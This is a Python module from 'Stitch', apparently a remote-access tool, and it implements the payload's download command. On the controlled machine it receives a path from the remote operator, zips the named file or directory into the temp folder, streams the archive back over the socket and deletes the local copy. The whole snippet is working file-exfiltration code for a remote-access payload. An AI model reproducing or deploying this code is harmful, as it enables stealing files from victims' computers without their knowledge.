# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
import zipfile

temp = 'C:\\Windows\\Temp\\' if win_client() else '/tmp/'
cur_dir = os.getcwd()
content = ''
d_file = receive(client_socket)
if temp in d_file and os.path.exists(d_file):
    os.chdir(temp)
    d_file = os.path.basename(d_file)

d_file = d_file.strip('\\/')
d_zip = ''
d_zpath = ''

if os.path.exists(d_file):
    if os.path.isdir(d_file):
        d_zip = f'{d_file}.zip'
        d_zpath = os.path.join(temp,d_zip)
        zipf = zipfile.ZipFile(d_zpath, 'w', zipfile.ZIP_DEFLATED)
        zipdir(d_file,zipf)
    else:
        if '.' in d_file and not d_file.startswith('.'):
            extension = d_file.index('.')
            d_base = d_file[:extension]
            d_zip = f'{d_base}.zip'
        else:
            d_zip = f'{d_file}.zip'
        d_zpath = os.path.join(temp,d_zip)
        zipf = zipfile.ZipFile(d_zpath, 'w', zipfile.ZIP_DEFLATED)
        zipf.write(d_file)
    zipf.close()
    d_size = os.stat(d_zpath)
    send(client_socket, str(d_size.st_size))
    with open (d_zpath, 'rb') as download:
        while line := download.read(1024):
            send(client_socket,line)
    send(client_socket,'download complete')
    os.remove(d_zpath)
else:
    err = f"ERROR: could not find {d_file}"
    send(client_socket,err)
os.chdir(cur_dir)
